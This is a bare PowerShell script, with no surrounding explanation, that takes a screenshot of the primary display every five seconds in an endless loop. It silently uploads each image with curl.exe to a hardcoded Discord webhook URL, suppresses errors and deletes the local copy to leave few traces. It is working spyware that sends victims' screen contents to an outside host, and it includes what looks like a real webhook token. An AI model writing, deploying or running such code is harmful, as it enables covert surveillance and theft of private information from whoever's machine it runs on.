$webhookUrl = "https://discord.com/api/webhooks/1507397879671685150/oRYUF8gCcyWpGAaRLBMA1pdAAvjRPq0iCfA7eXbnqI6-PZTVICQsAn-wbTbwjKMHyWoa"

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

function Take-Screenshot {
    $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $screenshot = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
    $graphics = [System.Drawing.Graphics]::FromImage($screenshot)
    $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
    
    $tempFile = "$env:TEMP\screenshot_$(Get-Date -Format 'yyyyMMdd_HHmmssfff').png"
    $screenshot.Save($tempFile, [System.Drawing.Imaging.ImageFormat]::Png)
    
    $graphics.Dispose()
    $screenshot.Dispose()
    return $tempFile
}

function Send-ToDiscord {
    param([string]$filePath)
    try {
        curl.exe -s -F "file=@$filePath" $webhookUrl | Out-Null
    } catch {}
    Remove-Item $filePath -Force -ErrorAction SilentlyContinue
}

# Main loop - every 5 seconds
while ($true) {
    $path = Take-Screenshot
    Send-ToDiscord -filePath $path
    Start-Sleep -Seconds 5
}
